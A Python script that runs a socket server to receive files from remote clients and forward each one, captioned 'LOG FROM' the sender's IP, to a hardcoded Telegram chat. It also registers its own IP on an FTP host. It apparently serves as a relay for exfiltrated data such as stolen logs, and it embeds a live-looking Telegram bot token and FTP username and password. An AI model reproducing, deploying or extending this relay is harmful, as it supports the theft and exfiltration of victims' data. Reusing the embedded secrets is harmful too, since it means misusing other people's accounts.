import socket, tqdm, telebot, os, ftplib, random, string
from _thread import *
from requests import get

ServerSideSocket = socket.socket()
BUFFER_SIZE = 4096
SEPARATOR = "<SEPARATOR>"
TOKEN = "1888960464:AAFi4PtqqjqprmU3h9m4VnsC30lqmXtH3ho"
MYID = "1391993288"
UNIQUE_ID = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))

if os.path.exists("retarget.key"):
   f_temp = open("retarget.key","r")
   UNIQUE_ID = f_temp.read()
else:
   with open("retarget.key","w") as f_temp:
      f_temp.write(UNIQUE_ID)

bot = telebot.TeleBot(TOKEN)
session = ftplib.FTP('files.000webhost.com','dotnetx','Sasasa123')
session.encoding='utf-8'
host = get('https://api.ipify.org').text
port = 12345


activeServers = []
current_num = -1
try:
   session.retrlines('RETR /activeservers.txt', activeServers.append)
except Exception as e:
   bot.send_message(MYID,f"Host: {host}\n\nПроизошла ошибка:\n\n{e}")
   session.retrlines('RETR /activeservers.txt', activeServers.append)
def check_host(UNIQUE_ID):
   for num in range(0,len(activeServers)):
      currLine = activeServers[num].split("_")
      if currLine[0] == UNIQUE_ID:
         current_num = num
         return True

if check_host(UNIQUE_ID):
   if activeServers[current_num].split("_")[1] != host:
      activeServers[current_num] = UNIQUE_ID+"_"+host
else:
   activeServers.append(UNIQUE_ID+"_"+host)

with open("activeservers.txt", "w") as txt_file:
    for line in activeServers:
        txt_file.write("".join(line) + "\n")

session.storlines("STOR " + "activeservers.txt", open("activeservers.txt", 'rb'))
os.unlink("activeServers.txt")

try:
    ServerSideSocket.bind((host, port))
except socket.error as e:
    ServerSideSocket.bind(("localhost", port))
    print(str(e))

bot.send_message(chat_id=MYID,text=f"[#INITIALIZED_NEW_SERVER]\n\n{host}")

print(f"SERVER READY\nListening on: {host}:{port}\n\nReady to work..")
ServerSideSocket.listen(5)

def multi_threaded_client(connection, address):
   try:
      received = connection.recv(BUFFER_SIZE)
      print(str(received))
      filename, filesize = str(received).split(SEPARATOR)
      filename = os.path.basename(filename)
      filesize = int(filesize.replace("'",""))
      progress = tqdm.tqdm(range(filesize), f"Retargeting:", unit="B", unit_scale=True, unit_divisor=1024)
      with open(filename, "wb") as f:
         while True:
            bytes_read = connection.recv(BUFFER_SIZE)
            if not bytes_read:    
               break
            f.write(bytes_read)
            progress.update(len(bytes_read))
      f1 = open(filename,"rb")
      bot.send_document(MYID, f1,caption=f"LOG FROM {address[0]}")
      f1.close()
      connection.close()
      os.unlink(f1.name)
   except Exception as e:
      print(f"ERROR: {e}")

while True:
    Client, address = ServerSideSocket.accept()
    start_new_thread(multi_threaded_client, (Client, address, ))
ServerSideSocket.close()